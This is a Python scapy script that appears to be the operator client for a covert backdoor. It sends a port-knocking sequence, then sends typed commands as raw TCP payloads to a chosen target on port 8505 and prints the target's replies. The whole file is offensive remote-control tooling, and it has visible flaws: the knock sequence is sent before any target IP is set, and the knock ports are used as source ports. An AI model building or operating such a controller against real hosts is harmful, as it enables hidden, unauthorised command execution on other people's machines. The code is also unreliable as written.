#!/usr/bin/python3

import time, os, sys, logging
import config
from scapy.all import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

results = ""
targetIP = ""

def checkRootPrivilege():
    if os.getuid() != 0:
        sys.exit("This application have to run with root access. Try again")

def portKnocking():
    global targetIP
    portKnocks = config.portKnocks
    for port in portKnocks:
        packet = IP(dst=targetIP)/UDP(sport=port, dport=8005)
        send(packet)
        time.sleep(1)

def sendCommand(cmd):
    packet = IP(dst=targetIP)/TCP(dport=8505)/Raw(load=cmd)
    send(packet)

def recvCommand(packet):
    global targetIP
    if packet.haslayer(IP):
        if packet[IP].src == targetIP:
            #data = parsePacket(packet)
            if packet.haslayer(Raw):
                cmd = packet[Raw].load
                print(cmd)

def main():
    global targetIP
    checkRootPrivilege()
    portKnocking()

    while True:
        targetIP = input("Enter the target IP: ")
        cmd = input("Enter command: ")

        sendCommand(cmd)
        while True:
            sniff(filter="tcp and dst port 8505", count=1, prn=recvCommand)

if __name__ == '__main__':
    main()
